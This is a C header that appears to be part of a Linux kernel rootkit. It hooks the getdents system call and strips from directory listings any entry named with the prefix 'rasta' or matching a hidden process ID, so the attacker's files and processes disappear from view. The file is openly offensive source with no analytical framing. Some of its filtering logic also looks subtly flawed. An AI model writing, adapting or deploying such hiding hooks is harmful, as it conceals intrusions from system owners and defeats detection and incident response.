#ifndef GETDENTS_H
#define GETDENTS_H

#define PREFIX "rasta"

static asmlinkage long (*og_getdents)(const struct pt_regs *);

static asmlinkage int hooked_getdents(const struct pt_regs *regs);

static notrace asmlinkage int hooked_getdents(const struct pt_regs *regs) {
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = og_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    // Allocate space for the directory entries (ensure ret is positive)
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error) 
        goto done; // Return -EFAULT if copying data fails
    

    // Iterate through directory entries
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        // Hide the PID by checking if the PID matches and it's not empty
        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0)) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else {
            previous_dir = current_dir;
        }

        // Hide entries with the specified prefix
        if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error) 
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

#endif

